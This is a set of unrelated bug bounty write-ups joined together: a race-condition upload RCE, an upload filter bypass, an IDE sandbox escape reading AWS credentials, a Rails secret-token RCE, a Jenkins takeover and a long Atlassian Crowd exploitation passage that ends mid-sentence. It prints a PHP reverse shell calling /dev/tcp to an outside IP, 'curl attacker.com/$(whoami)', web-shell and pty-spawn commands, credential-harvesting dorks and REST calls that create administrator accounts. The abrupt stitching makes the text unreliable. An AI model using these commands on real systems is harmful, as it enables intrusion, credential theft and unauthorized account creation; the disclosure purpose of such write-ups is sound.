Update II: “We” at this series of article will refer to Faisal Yudo Hernawan , Tomi , and Me. Update III: The way to exploiting the “upload.php” function has been released at Tomi’s write-up . It could be bypass with the .phtml extension. I. INTRODUCTION 1.1. Few Words about this Write-Up As an information, this simple write-up talks about a story related how I chained few bugs at one of private program, which is from a simple recon to simple SQL Injection, Race Condition, and finally lead to an RCE. Since the found RCE is little unique, then, this simple write-up will begin from an RCE that triggered from Race Condition. InshaAllah, the other will be released later. 1.2. Simple Summary Some reader maybe feels more comfortable with a summary. Then at this section, we will explain the whole summary related our “journey” to get an RCE. While we got an access into the internal dashboard of administrator (by using the account that has been dump from SQL Injection Result), then we found out the upload feature in the app. Basically, this app has a protection for not giving any permission to users to upload the .php extension (let’s say, the function is upload.php - previously, it was vulnerable by uploading the .phtml extension). But then, the first unique issue is come when this application provides another function (let’s called, modify.php ) that could be used to replace / deleteing the previous uploaded file. The good one is, this modify.php function is not designed to filtering any extension just like the upload.php did. So, we could easily to upload the .php file into the site. But then, the problem for us exists when the app moving out the uploaded file into the S3 bucket. In other words, it’s not possible then to get an RCE at the app’s server since the shell is stored at S3 bucket (and didn’t work too). At one condition, then we tried to re-send the upload request (by using those modify.php function) multiple times (it just like a race condition) and suddenly we got a different response length that contain an error with local stored path information. From this execution, then we realized if the file was stored locally around 2 seconds before its automatically moving into the S3 bucket. So, the next is, we setup the listener at our server (by simply using an “nc -lvp listener_port”), and then tried to conduct the same race condition again (with re-uploading the reverse shell at the modify.php function) and finally in parallel, we request the found local stored path previously at the our browser (it just like, we press the “Command + R” multiple times) until our terminal showing up the shell from the app’s server. After several request (somehow more than 20–30 requests), then finally we got a shell of the app’s server. Press enter or click to view image in full size Figure 1 RCE Result II. THE DETAIL STORY ABOUT THE RCE At this section, we will try to explain in step by step about how finally we got an RCE. FYI, we tried to sketch the interface manually as best as we can, so hopefully could help the readers to see the situation. 2.1. Facing the Internal Dashboard — Meet the Upload Function So, after we got an access into the internal dashboard (will be released later about how we got it), we didn’t stop hunting. At this point, then we tried to look any file upload feature that maybe exist at the app. After few minutes, then we finally found a feature that could be used to publish a news/article via this dashboard. And then, we learn that if every file that we would like to upload to every available section (news/article or anything), then it will be procced by the function called upload.php. Basically, every available section will have an upload interface like this: Press enter or click to view image in full size Figure 2 Interface of Upload Feature Without thinking too much, then we directly upload the simple .php shell again via this feature ( previously, it was vulnerable by giving the .phtml extension and fixed. Then we tried to test this feature again). But things aren’t going well, the feature has a protection to filter the .php extension. We tried to combining the extension with upper & lower case (ex: .PhP), also added some number behind the extension (ex: .php3), and tried various way (as far as we know — doubling the extension, null character, added ; character, and more) to bypass the protection, then it failed. We always got this lovely warning. Press enter or click to view image in full size Figure 3 Protection at the Application Then we think, how about the stored XSS, such as maybe upload the .html, .xml, or .svg format? Well, this one is successfully uploaded. But then, we realized if the file was moving out into the S3 bucket. Then, what’s the point if we could trigger the XSS but at the S3 bucket domain? Well, since we have no idea to “using” it further, then we assume if this one is not an issue. 2.2. Meet the Second Upload Function, Modify.php What’s next? After we have no idea about how to “use” the “uploaded” file into the S3 bucket, then we back into first page of “news” section that contain so many forms to be add with the new content. After looking it carefully, then we realized if there is an “edit” button at the same row with the legitimate file that uploaded into the S3 bucket. Press enter or click to view image in full size Figure 4 Function Edit / Delete the Uploaded File At this point, we try to click the “edit” button and trying to see what will happened. Just as expected, then we will face the upload feature too at this section. At the first time we see it, we think that this form is filtering the .php extension too (since we thought, how can it could be different with the first one?). But, surprisingly , this upload feature doesn’t filter any extension yet. In short, we could upload the .php file directly without meet any trouble. Press enter or click to view image in full size Figure 5 Upload Feature to Replacing the Existing File When our shell has been uploaded, then we try to re-upload the shell and find out the function that used. If this one doesn’t have any filter feature yet, then high possibility if this is the different function as previous. And our assumption is correct. The function that used at this endpoint is “ modify.php ”, not “ upload.php ”. Here is the sample request that made with “modify.php”: Content-Disposition: form-data; name=\"fileid\" 31337 -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"name\" picture-1.png -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"description\" -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"userfile\"; filename=\"reverse.php\" Content-Type: text/php <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'\"); -----------------------------09234599689937136550676151776 Content-Disposition: form-data; name=\"save\" Save So, is it finish? So sad, not yet . The .php file is also moving out into the S3 bucket and we can’t do anything with the uploaded file. 2.3. Race Condition to Get the Local Path To be honest, at that time, we have no idea anymore, until we finally try to send the request multiple times with “null” payloads (via intruder mode at burpsuite). Please kindly don’t ask, why we do that. Surprisingly, after several request has been made, we got a different response length (somehow need around 10 requests, somehow more than 20–30 requests). If the normal request will result to 1147 response lengths, at one point, it hits 1710 response lengths. Here is the sample of the “same” multiple request that we did: Press enter or click to view image in full size Figure 6 Sending Multiple Request with Null Payload And here is the normal response that we will get normally (1147 response lengths): Press enter or click to view image in full size Figure 7 Normal Response with 1147 Response Lengths So, what is the content from the un-normal response length that we got? The good one, it reveals the local path of the file. Press enter or click to view image in full size Figure 8 The Race Condition has Reveals the Local Path When we see this result, then finally we thought if we just need to access the path at the browser and waiting for the listener triggering up the shell. But once again, so sad, it not like that. When access the file via our browser, we got the famous alert, which is: “File not Found” . And if we check the path of the file that has been uploaded, it still showing the S3 bucket location, not the local path that we got from this error. So, from this execution, we learn if the file is somehow was stored locally around 1–2 seconds before they move it automatically into the S3 bucket. 2.4. Triggering the Shell and Got an RCE From the last assumption, then there is one thing that come up at our mind: “ how if we run the race condition again, and at the same time, we request the local path that we found (from the error result) to our browser to triggering the reverse shell? ” How is it? Finally, this trick works well . So, we setup the listener at our server -> then try to replacing the existing file at the app with our reverse shell -> conduct the race condition multiple times (1,000 requests could buffer our time) -> take the local path from the different response length from race condition execution -> repeatedly access the path via our browser -> and when the app is hit by the race condition again, then the shell will be triggered into our listener. Here is the simple flow related the execution: Press enter or click to view image in full size Figure 9 Flow of the Execution And here is the simple result from the RCE: Press enter or click to view image in full size Figure 10 RCE Result III. THE CLOSING Much things (at least, for us) that we could learned from this bug. Few of the good things are: There is a possibility for us to get the local path of the uploaded file before the file itself is moving out into the S3 bucket. Even only 1 or 2 seconds, then its enough for us to triggering the shell into our listeners; Always try to edit your own uploaded file. From this case, we seen that if there is a possibility if the upload feature is executed from two separate function (which is the upload.php and modify.php in this situation); And maybe much more that we don’t know yet.

The website was a crypto trading platform and i was looking for P1. For those who always worry to find P1's, here are few things you should look at. Chaining of bugs + Impact to whole application/server + Difficult to Exploit? Make it easily exploitable ;) Here is the one to learn single click exploits https://vulnerabilities.in/blog/ Logging into the application have functionality “File Upload” If i want to find RCE the first thing comes to my mind is to play with file upload functionality. There are many other ways to find RCE. This will be helpful https://medium.com/@ozguralp/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311 Let’s direct to the POC — Application allows users to upload only image files, i tried uploading html, php files but i was restricted to upload such files. Press enter or click to view image in full size Then what? Lets Bypass.. I tried changing file type .php to phps, phpt, php3, php4, php5, php.jpg etc.. and also tried Googling for “ file upload bypasses hackerone ” and learned very good reports, then a thought comes to my mind “ how images are getting validated? ” I saw content-disposition and content-type headers while uploading files. I tried playing with these headers, removed both content-disposition and content-type headers to check if these are checking at server side. Yes! it was checking at server side and i was not able to upload images without content headers. To be professional we should learn how things are working. “ first learn it then break it ” with this thought i started learning things from OWASP file upload bypasses https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload and the bypass was available in OWASP sheet. Tried uploading png > Captured request with burp > Changed Content-Type: image/png to Content-Type: text/html Press enter or click to view image in full size Bypassed! The content-type header was checking at server side but there was no header validation so i was able to bypass file upload functionality. Checking — if http request comes with these headers. validation — what value should come with these headers. File Upload? Bypassed..!! RCE? Let’s see… Uploaded php file with code inside <?php phpinfo(); ?> (php file upload > right click > view image > phpinfo page) — Remote Code Execution!

I heard saying people “ RCE is not a direct vulnerability, it is the end result of a vulnerability ” Press enter or click to view image in full size But to be clear, Remote code Execution is not the end, if you finds RCE in bug bounty program then first think what you can do with it. Example : As this was a crypto trading platform, found db-credential > logged in to database > found myself in users table > able to add a lot of BTC’s to my account. P1 ¯\\_(ツ)_/¯ Also after “ Remote Code Execution ” we can go for “Privilege Escalation” which will be helpful for further exploitation. but.. Note : Before proceeding for further exploitation first read the programs policy, if you are allowed to do further exploitation then go for it or else submit a request and take approval and then ./exploit 😎 Here are 2 good blogs for learning privilege escalation techniques. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ A guide to Linux Privilege Escalation What is Privilege escalation?

Follow Keybase Twitter LinkedIn GitHub Stack Overflow YouTube Responsible Disclosure: Breaking out of a Sandboxed Editor to perform RCE 3 minute read Table tl;dr Story - Finding the issue - Trying out things - Reading AWS Credentials Timeline tl;dr Found a way to escape the sandboxed editor to perform Remote Code Execution which leads to the ability to view AWS credentials, SSL certificate and other stuff. Pretty much owning the entire machine Story - Finding the issue If you are still here after reading the tl;dr, I guess you are here for the story? So, let me give you one. While doing recon I found many sub-domains and IP addresses belonging to HackerEarth, one of them was https://[REDACTED]/#/home/node/he-theia/sandbox which was running an online ide built on top of vs-code named Theia IDE . At first glance, it looked pretty boring, after all, it’s an IDE running in a browser (wait, that’s normal since most of them are electron based ) So, anyway, I played around with it for a while, the ultimate goal was to execute random code on the machine. But, they removed the terminal view command from the IDE shortcuts and menu. So, I tried to “run” the code file but that option was also not available. Then poking around I tried “Task: Run selected text” by bringing up the global action menu shortcut from vscode (ctrl/cmd + shift + p) and lo, and behold, it opened up a terminal. One I got the terminal access, it was easy to demonstrate the RCE. Trying out things I tried with the possibility of reading system config files and was able to read HackearEarth’s private SSL .crt and .key files. Pretty much, most of the system configuration files. I was even able to read the git log and original ide_fetcher.py that powered the ide initial startup commands since the repo cloned still had git metadata. Through some command-line fu, I was able to read the original arguments used to invoke the web-ide. Reading AWS Credentials After it was clear that I was able to read system files, write arbitrary files and command, I wanted to see if it was possible to use the terminal to read AWS credentials since the instance was hosted on AWS infrastructure just like the rest of the HackerEarth’s infrastructure. I first tried the usual metadata URL to access aws details curl http://169.254.169.254/latest/api/token but it didn’t work instead it gave me curl: failed to connect . Lost, I tried to ping the domain that also didn’t work. Then I found a blog by Puma Scan on Cloud Security - Attacking The Metadata Service There it was mentioned that attacking ECS metadata was different from attacking EC2 metadata service since it was served from a different domain. Then I checked the environment variable output again which I ignored earlier for some reason and it was right there in front of my eyes the whole time. It contained both the ECS_CONTAINER_METADATA_URI and AWS_CONTAINER_CREDENTIALS_RELATIVE_URI After that, it was just a curl away Timeline Tue, Dec 24 [ 7:35 PM IST] - Reached out to HackerEarth support about the issue Wed, Dec 25 [ 9:50 AM IST] - HackerEarth support team asked to submit the issue to them so that they can forward it to security team (Although I wanted to report it directly to security team) < Back and forth regarding submission > Wed, Dec 25, 2019 [ 10:25 PM IST ] - Submitted the issue along with detailed POC and evidence Thu, Dec 26, 2019 [ 05:49 PM IST ] - The instance was down. I asked HackerEarth for the confirmation of the fix. Fri, Dec 27, 2019 [ 12:57 PM IST] - HackerEarth confirmed the fix from their end.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRCE due to ShowExceptions Search this site Embedded Files Skip to main content Skip to navigation RCE due to ShowExceptions Hey guys, First of all a good news, I'm starting to blog my findings again, I have few posts ready just waiting for confirmation from companies to make them public. Getting Started So a few days back i started testing a private BB program, I found a straightforward RCE on it. I choose'd to start hunting on the main web app i.e. https://app.redacted.com , While going through i found an endpoint which downloads a CSV report via redacted.redacted.com (In-scope asset). The filename and its content was defined in the request it self, Something happened I was fuzzing around parameters, When i passed %0d to file_name the server threw an exception, The exception thrown because Rack's ShowExceptions was on. It's more than something As the the Rack's page suggests, \"Be careful when you use this on public-facing sites as it could reveal information helpful to attackers\", This must not be turned on on production environment. Rails (up to v4.0.2 NOT SURE) had a Secret token in /config/initializers/secret_token.rb. This token is used to verify the integrity of signed cookies (Any cookie set by your rails application is signed using this token), From Rails 4.0.2 this token is kept as environment variable `action_dispact.secret_token`. The exceptions page also leaks or better say includes this too. This token can be used to get RCE ( https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/ ) You can read about this on the given link to understand and know how this works. I quickly used the above code to generate a cookie to execute `curl attacker.com/$(whoami)` and got an request to attacker.com/app. This RCE was applicable for both https://app.redacted.com/ and https://redacted.redacted.com/ because both shared same rails app. That's all folks :) Share/Retweet is much appreciated.

This could be enough to report and get bounty — due to lack of confidentiality. But, as they say..try harder! From experience I have come to appreciate that the objective in bug bounty is to simulate a bigger impact as long as you are within the program’s bug bounty guidelines. On closer inspection, some nodes had the jenkin instance with the ‘manage jenkins’ configuration option. I was fortunate enough to find 2 hosts with this configuration option. Press enter or click to view image in full size ManageJenkins config option I chose to install the terminal plugin on both and hence could exhibit that remote code execution was possible! I quickly sent in my responsible disclosure email, and I got quick response; bounty and HoF followed :-) A couple of weeks later, I replicated the same issue on another fortune 500 company — another one!

YoKo Kho 21 min read · Feb 18, 2020 -- 4 Listen Share بسم الله الرحمن الرحيم Mirroring from: http://www.firstsight.me/2020/02/from-recon-to-optimizing-rce-results-simple-story-with-one-of-the-biggest-ict-company-in-the-world/ Here is a little story about how I finally could got into an internal network (and could accessing all of their internal assets) at one of the biggest ICT company in the world by using various vulnerabilities (from sensitive data exposure, miss-configuration, until outdated version of application that vulnerable to unauthenticated RCE). Note: The program owner has given me a permission to release this article. PDF Version: Download here. So, as my other write-ups, this simple article will has 2 different approaches, which are: For the one that just need the main point of this article (yes, it could saves tons of minutes if readers understanding every flow already. Just please kindly see the TL;DR section), and For the one that need to understand the flow of execution or journey about these findings (InshaAllah it could tell the readers about some of my approaches). Hopefully it also could help people on “first stage” of their red teaming activity. Please kindly enjoy the story. I. TL;DR In short, there are 3 separate main points (let’s call it as stages) that was done as the process to gain their internal network, which are: Looking for the target’s credentials and internal IP Address at Github (including the pattern from both of those things) and continuing it with learn their development culture such as the used framework (it could make us easier to know if this one belongs to them or not). See Th3g3nt3lman talks at Bugcrowd University : Github Recon and Sensitive Data Exposure . The second one is the things that I don’t know why I do it, but it works! So, after got their passwords pattern, I use the simple google dorks to find if any accidental leakage that indexed by Google or not. The simple dork is: site:*.target.com AND intext:’their_password’ See One of my write-up: Information Disclosure at PayPal and Xoom (via Google Dork) . And the last one, I went back to my subdomain enumeration result and finally found one of their subdomains was using the outdated Atlassian Crowd version. By using the public exploit of CVE-2019–11580 , then I’m able to get the root access of this server. And while looking the internal IP of this server, I realize if this server was located at their internal network that has a direct internal access to non-public and to most of their public assets. And yes, as you could see, all of the information from the first point (Github recon) also could be use at this stage, since there are no any security perimeters (such as firewall and other) to communicate with other asset (Yes, this summary was strengthened because I successfully got several responses of their internal IP Address from other segment while pinging to their several assets).

THE JOURNEY So, back to December 2019 ago, I was planned to optimizing my hunting activity to the target that I’m active enough at them around the last few months. With a hope of get an RCE and could access into their internal assets, then I tried to conduct several activities from basic. 2.1. Recon from Github Because I have already (at least) thousands of their subdomains (and have no idea yet what I should do after found more than 90 findings within about 3 months), then I tried to get backs to basic again. In that situation, I tried to conduct a recon at Github to find some information that I might be able to get. (This talks could be a very good reference: Github Recon and Sensitive Data Exposure ). So, what is the point of this recon? Is it to look for credentials and test it to the affected service to find it valid or not? Mostly, yes. But I also tried other approaches that might lead me to something good. Things that I do was: 1. Collecting the credentials (whether still valid or not) and then try to find the pattern . This is to find out the default password that may be given by their administrator to every user while creating an account. The purpose of this one will be answered at the next section (#2.2). Press enter or click to view image in full size Figure 4 Few Valid and Invalid Credentials that Found at Github From this activity, I found around 50 different passwords. 2. Collecting the IP Address and try to learn the pattern . There are 2 points that could be achieved at this situation, which are First reason: as a supporting data for our report to the program (remember, there are analysts that standby to analyze the report before they send it to the program owner. Just don’t waste their time by reporting issues without any analysis). What I would like to say, if the result of the recon contains much of internal assets (can’t be access from public), then there are also the false alarm possibilities. So, when you have learnt the pattern, it can help you to analyze whether this repository belongs to them or not. Is it true? Well, at least I successfully found 5 P1s from this method. Press enter or click to view image in full size Figure 5 Few of Reported Issues Believe me, reporting an issue with an analysis will not waste the analyst’s time. And, they will also be happy to help you ask the program owner directly. The second reason is to make it easier for us to connect to the found asset when we gain the access to their internal network later. 3. And finally, the third one was learning their development culture. In this part, after about 16 hours of recon (separated in few days, I just spent around 2–3 hours a day), finally I found few (pattern) of the used framework to develop their internal application. It also makes it easier for us to identify which one that belongs to their assets At the other part, this point can also help everyone who are strong in the source code review to find out the weakness that might exist in the related application. So, these 3 things are the first stage of our recon to gather a lot of information about the target. But how do I do it? I’ll explain in the next section before continuing to the second stages. 2.1.1. The PoC — Recon from Github At his talks , Th3g3nt3lman has provided the comprehensive explanation. But there is nothing wrong if I try to explain it again. So there are common mistakes that happened among developers when using the collaboration software tools such as Github, which is they put credentials (especially the valid one) in the public repository. Of course there are many factors that make it can happened, either because the developers doesn’t know if Github has provided the “private” feature for free at this time, or the developers doesn’t realize if an unauthorized person could also find their public repositories and use the sensitive things for their own purposes. Note: Regardless of the factors, of course this is something that must be considered and gain important attention since this issue commonly used as one of the first stages to get into the target’s network. Back to topic, things needed to reproduce this recon are by login into our Github account and start to optimize the search by using various keywords such as: password “.target.tld” . Please kindly note, at the other side, the “password” keywords could also be replaced with other nice one such as telnet, ftp, ssh, mysql, jdbc, oracle, and other. target.tld “password_value_here” . To be honest, I don’t know how the Github’s search feature works, but by using these 2 different keywords, I got a different result that leads me to find something good. So, let’s say you found a repository that contain a password that belongs to one of those target’s asset. All you need to do is just don’t stop there . Explore more information from this repository, such as: i. Does this user store other credentials (of the target) at those found repository or from other repositories that owned by the user itself? This could be done by using the simple keyword (such as password , pwd , pass , and similar like that) to this repository specifically. Press enter or click to view image in full size Figure 6 Sample of Specific Search to Specific Repository Press enter or click to view image in full size Figure 7 Sample of Specific Search to Repositories Owned by this User Specifically ii. Does this repository have another endpoint information? This could also be done by using the simple keyword (such as target.tld ) to this repository specifically. How if we don’t find anything? Then try to look to another repository owned by this user. iii. If both of those flow “don’t work”, then try to find other users who collaborate with this user in this repository. Let’s say, you found B user. Then try visiting those users and repeat the first (i) and second (ii) step in this user account to find other possible good information. As a recap, I made a simple mind map that might be useful for readers: Press enter or click to view image in full size Figure 8 Mind Map of Simple Github Recon 2.1.2. Commonly Asked Yes, I hear you. All of these (manual) activities will take a lot of time and there is no guarantee if we could find interesting information. But, that’s the point of testing/hunting, right? This is not a common competition that is commonly made vulnerable by design (not every competition is like this, but some are similar to this), this is something we don’t know for sure if we haven’t test it . Are there any automation tools out there that could be used to help us conduct this activity? Yes, a lot. But when I tested several public tools, I didn’t find much things that I found from this manual activity. So, the automation tools are useless? No, I’m not saying that. Combining both automation and manual way is a wise thing to do to optimize the result. If the automation tools don’t find things that I found from the manual way, it also applies vice versa. 2.2. Recon from Google Dork After I thought that I had gathered enough information, then I went to the next stages. To be honest, I have no idea why I did this, but it seemed very reasonable to do it at that time. In short, I tried using a simple Google Dork, which is by put their internal (private) subdomain and the password patterns that I found as keywords. Note 1: How I know about their internal (private) subdomains? To answer this, please kindly refer to the explanation at the first stages. To summarize, from the first stages recon activity, I found an interesting subdomain that contained several more subdomains. From here, I assume if this subdomain is used by them as part of the development area. Press enter or click to view image in full size Figure 9 A subdomain that Contain Multiple Subdomain — For Development Area As stated earlier, since it is an internal subdomain (private) one, then all of these subdomains can’t be accessed from public area. Note 2: To know more details about recon with Google Dork, just please kindly refer to one of my write-up about PayPal and Xoom . And here is the simple keywords that I used: site: *.subx.target.tld AND intext:' one_of_password_pattern_value_here ' The reason behind this one is: I’m trying to find any possible sensitive information (containing those password pattern) that might be available at that subdomain (although I know if those subdomain is only available with internal access). And guess what? It works! Press enter or click to view image in full size Figure 10 Found much of Sensitive Information From this stages, I got a lot of information such as credentials (for the web and other services such as FTP or SSH), other endpoints, internal IP Addresses, and more. One good thing, some of information can be accessed from public area, but some of them requires an internal access. Please kindly note, by optimizing the used keywords, we can also enumerate more information from this recon. For example, just change the “password pattern” in the intext parameter with other values such as found IP Address (just put the first two octet), product name (Oracle, MySQL, MSSQL, and other), services name (FTP, SSH, DB, and other), other keywords that commonly used for login activities (such as password, pwd, pass, username, userid, and other), or other keywords that commonly has a relation with login (such as dashboard, cms, and other). 2.2.1. The Result — Recon from Google Dork One very good result that I got was, there are about 4 accounts that I found that can be used to access the “in-scope” program portal and this accounts has access to customer data. And yes, this account uses a password pattern that I found at the Github recon activity. Press enter or click to view image in full size Figure 11 Few Good Results On the other side, I also able to access one of their “ super admin ” account (so sad, not in the “in-scope” assets) which contains many of the big names of companies that are their clients (with a lot of transaction data). (I’m sorry, I can’t give a screenshot of those portal). Press enter or click to view image in full size Figure 12 Resolved Already — They just didn’t Update yet And what else? Well, as said before, I also success to get few accesses to another endpoint (with the found account) that contained a lot of sensitive information. But what about the information that can’t be used because it requires an internal access? No worries. We will keep this, as we keep the information that we got from Github recon . 2.3. Unauthenticated RCE at Outdated Version of Atlassian Crowd 2.3.1. Found Outdated Atlassian Crowd Application So, I have gathered a lot of their internal information. I also have their passwords pattern. But I have a real problem here, which is, although I have reported almost all of the issues that I found from the 1st and 2nd stages (that can be accessed from public area), I still don’t have an internal access yet . From this situation, then I try to see the results of my subdomain enumeration again. To make it easy, I use the aquatone capture feature . After looking carefully, finally I found an endpoint that looks old. It only contains few words with clickable link, for example: 1st words, 2nd words, 3rd words, and crowd. From all of the words, the only thing that caught my attention was “ crowd ”. ( Note : as expected, other clickable links don’t contain anything good to be exploited). When visiting the “crowd” clickable link, then I was redirected to a subdomain that contained an Atlassian Crowd Application. Press enter or click to view image in full size Figure 13 Found the Outdated Atlassian Crowd Application As a simple note, while conduct a fast testing , I also put myself to focus on 3 things (for people who take the offensive-technical certification and similar with it or playing around with HackTheBox and similar with it, will be familiar with this common concept), which are: Test towards used accounts and passwords Testing towards patch that hasn’t been implemented yet (obsolete/ outdated version) Test towards configuration mistakes that have been implemented. In short, I found the exploit information by using the simple Google Dork. Press enter or click to view image in full size Figure 14 Looking the Information about the Public Exploit After looking carefully at the information, I found if the used version is affected with this Unauthenticated RCE issue. It marked as CVE-2019–11580 . The next thing that I do is looking for the possible released public exploit. In short, I got this link: Press enter or click to view image in full size Figure 15 Public Exploit of Few Atlassian Crowd and Crowd Data Center Versions — RCE 2.3.2. How I Know if this one is Vulnerable? There is simple thing that can be executed to determine whether the application is vulnerable or not. All we need to do is just visit the uploadplugin.action endpoint at /admin/ path. If the application show an error message “ HTTP Status 400 — Requires POST ”, then most likely, the application is vulnerable to this RCE (This tells us if the plugin is available and can be used without the need of authentication). Press enter or click to view image in full size Figure 16 Show an Error Message “Requires POST” 2.3.3. The Execution Reproducing this issue is quite simple. All we need to do is just download the working exploit that one of them is could be found at https://github.com/jas502n/CVE-2019-11580 . When the script was executed to the target (and the target is vulnerable), then the web shell will appear automatically. ( And yes, we are in )! Press enter or click to view image in full size Figure 17 Executing the Script To accessing the web shell via web browser, then we just need to visit the /crowd/plugins/servlet/exp?cmd=command_here endpoint. Just replace the “ command_here ” with another OS Command. Press enter or click to view image in full size Figure 18 Root Access To summarize, very good things about exploitation of this target are: We don’t need any valid username or password to execute this one. (that’s why it called unauthenticated / pre-authenticated RCE); The second one, the RCE was executed as root user . It means, we don’t need to do anything to get the root access; And the third one, there is no security perimeter that protect this application . So, we found no difficulties when exploiting the target. 2.3.4. It doesn’t Enough, we need a Shell that can Interact with the System! Since we have no interactive shell yet (the shell that could interact with the OS by passing the data that we input ), then we have to connect this shell to our machine first. Commonly, I use the Reverse Shell cheatsheet from PentestMonkey . But so sad, there are no command that works that can connect the shell to my machine. Most likely, the application filter the special character such as > & , ‘ and “ From this situation, then I put the simple reverse shell python script at my machine then I forced the target to download it (by using the available web shell). Figure 19 Simple Reverse Shell Script in Python Press enter or click to view image in full size Figure 20 Downloading the Script from Our Machine At this case, we finally have our own reverse shell script (in python) at the target’s server. But the problem is, this script isn’t executable. So, next thing that we should do is to chmod the script (for example with 700, since our access is root already). Press enter or click to view image in full size Figure 21 Chmod the Python Script into 700 So, now our script should be executable since we have changed the permission. Press enter or click to view image in full size Figure 22 Script become Executable — rwx After our script has been downloaded, then we just need to setup the listener at our server. $ nc -lvp <our_port> Then, try to execute the python script at the target’s server via our deployed web shell: Press enter or click to view image in full size Figure 23 Gain the Interactive Shell Press enter or click to view image in full size Figure 24 Shell was Executed as Root At the first time we can connect to our reverse shell, basically we still don’t have an interactive shell yet. So, thing that we need to do is just to run a simple command with python: python -c 'import pty;pty.spawn(\"/bin/bash\")' From here, then we finally have the interactive shell. We also could connect into the database or other service without worry. Note: See G0tmi1k’s personal blog for more information: “ Basic Linux Privilege Escalation ”. Press enter or click to view image in full size Figure 25 The Interactive Shell that allow us to Connect into the Available Database 2.3.5. What’s Next? So, one of the best things from this RCE is, this server is located at their internal network. When I tried to ping several public assets, I also got a nice (internal IP Address) response. And yes, it means, we are in the internal network of one of the biggest ICT company in the world! And now, remember about much of internal information that we got and keep from the first and second stages? Then we also can use it at this 3rd stages! And finally, our journey to get an internal access at this company has been finished. I have reported the issue and got a very nice response. Disclaimer: I didn’t execute any further. All I do only shows things that can be used from the data that I got from the previous stages. Just don’t do it in bug hunting without any permission. Note: Although the issue was found in “out-scope” target, at least I have reach one of my dream in my bug hunting activity, which is get an access into one of the powerful ICT company in the world from external area (well, yes, in my point of view, it seems more difficult to get RCE and get an internal access in bug hunting than in formal pentest jobs. Sometimes we joke around with other friends, “ getting an RCE in bug hunting / bug bounty program — looks like a fairy tale ”).

Login into Crowd’s Database There is a possibility if some of you ask about how I can login into their crowd’s database. As an additional information, they also have the installed Atlassian Confluence at this server. And for the record , I honestly have no idea about the integration flow of Atlassian Confluence and Atlassian Crowd or even how it works. The thing that comes into my mind, if I see a database connection (via netstat), then most likely, there is a database connection configuration on this server too (that commonly store the credentials in cleartext). After searching for some references, I finally found an article that explained if the credentials were stored at <confluence_home>/confluence.cfg.xml file. Press enter or click to view image in full size Figure 28 An Article that Explain the Location of Database Connection Configuration Figure 29 Trying to Find out the Location By using the simple “locate” command (since I don’t know the exact location of the confluence.cfg.xml file), then I find out if it was located at /opt. Press enter or click to view image in full size Figure 30 ClearText of Database Connection String And for the rest, as you clearly see at previous section, I success to login into their database. Press enter or click to view image in full size Figure 31 Success to Login into the App’s Database 2.3.6.2. Stored Password is Encrypted, Can You Login? Yes, I believe in some situations (at formal activity), it would better if we get the clear view of data (for example, accessing the GUI) so it can help us to have better understanding in identifying possible risks that may exist (either to identify application flaw that might exist or to find the data that might be used for other executions). So, should we brute force ? Yes, we can also brute force the passwords, but I don’t think it’s a good choice if our time is very short (unless you have great cracking machine). Can we replace the encrypted password with the new created password (for example from our own crowd)? I believe that is possible. Atlassian also provides this “solution” at their official portal. In short, we can replace the existing administrator (hash) password with hash value for “ admin ”. Press enter or click to view image in full size Figure 32 How to Replace Administrator Password Did I execute this? The answer is NO . Without any permission, we can’t do it. (yes, in a real attack, the Attacker will do it without asking any permissions, but kindly note that in bug hunting, we didn’t come with the intention to breach ). At the other side, replacing this password will also make the administrator / developer realize if something wrong has happened. So, with few considerations, I choose to create a new account just to notify the program owner if there is a risk that also could allow an Attacker to login into the existing application. From here, then I try to find out about the possibility to create a a new account without the need to login into the application. After searching few references, I finally found out if this was possible through REST as long as we had an administrator password of crowd. Press enter or click to view image in full size Figure 33 Find Out the Location of File that Stored Administrator Password Since the version of affected Atlassian Crowd was v.2.x, then this article still valid for us to create an account. Press enter or click to view image in full size Figure 34 The Attributes of crowd.properties File Again, by using the simple “locate” command, then I successfully found the location. 2.3.6.2.1. Create an Account via REST This article below helped me a lot in creating an account. Press enter or click to view image in full size Figure 35 Create New Account via REST API In short, it should be like this: curl -i -X POST http://subdomain.target.com /crowd/rest/usermanagement/latest/user?username= your_new_user_here -H 'Content-type: application/json' -H 'Accept: application/json' -u crowd_administrator_username_here : crowd_administrator_password_here -d' > { > \"email\": \" your@email_here.tld \", > \"name\": \" your_new_user_here \", > \"password\": { > \"value\": \" your_new_user_password_here \" > } > } > ' Note : your_new_user_here = means our username that we would like to create crowd_administrator_username_here = means the crowd’s administrator username crowd_administrator_password_here = means the crowd’s administrator password your@email_here.tld = means our email for our username that we would like to create your_new_user_password_here = means password that we would like to use for our account If success, then we will get a nice response: HTTP/1.1 201 Created Server: Apache-Coyote/1.1 Redacted. Is it finish? So sad, no. We need to activate our account. In reality, (as far as I know) there are 2 ways to do this, which are by asking the administrator to activate our account (that’s not possible, right?) or we activate it ourselves with other REST API function. 2.3.6.2.2. Activating New Account via REST From this article, we will get the answer about how we can activate our account through API. Press enter or click to view image in full size Figure 36 Tutorial — How to Activate Our Account via API In short, it should be like this: curl -i -u crowd_administrator_username_here : crowd_administrator_password_here -X PUT --data '{\"name\":\" your_new_user_here \", \"active\":\"true\"}' http://subdomain.target.com /crowd/rest/usermanagement/1/user?username= your_new_user_here --header 'Content-Type: application/json' --header 'Accept: application/json' Note : your_new_user_here = means our username that we created earlier crowd_administrator_username_here = means the crowd’s administrator username crowd_administrator_password_here = means the crowd’s administrator password If success, then we will get a simple response: HTTP/1.1 204 No Content Server: Apache-Coyote/1.1 Redacted. After that, we will be able to login into the application. Press enter or click to view image in full size Figure 37 Success to Login into the Application III. LESSON LEARNED So, here we are, almost at the end of the article. In this section, I would like to add a simple recap to make it easier for readers to understand few lessons of this simple journey: In my simple perspective (just please kindly correct me if I’m wrong), recon doesn’t always mean an asset discovery activity. In this one, it can also mean that we try to learn how the API works, target’s development culture, and more. Remember, while responding one of @Mongobug ’s tweets, @NahamSec also explains about one of recon’s definitions in the very simple words : “ Recon shouldn’t just be limited to finding assets and outdated stuff. It’s also understanding the app and finding functionality that’s not easily 